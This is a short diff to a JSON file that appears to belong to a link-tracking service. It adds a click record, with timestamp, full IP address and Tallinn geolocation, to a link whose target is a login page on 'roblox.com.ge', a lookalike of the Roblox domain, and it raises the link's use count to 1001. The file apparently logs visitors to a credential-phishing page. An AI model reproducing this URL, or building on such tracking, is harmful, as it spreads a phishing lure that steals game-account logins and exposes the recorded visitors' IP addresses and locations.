@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1000,
+    "useCount": 1001,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8120,6 +8120,14 @@
         "city": "Dobrzyń nad Wisłą",
         "flag": "🇵🇱",
         "countryCode": "PL"
+      },
+      {
+        "timestamp": 1777222546179,
+        "ip": "217.159.209.236",
+        "country": "Estonia",
+        "city": "Tallinn",
+        "flag": "🇪🇪",
+        "countryCode": "EE"
       }
     ]
   },
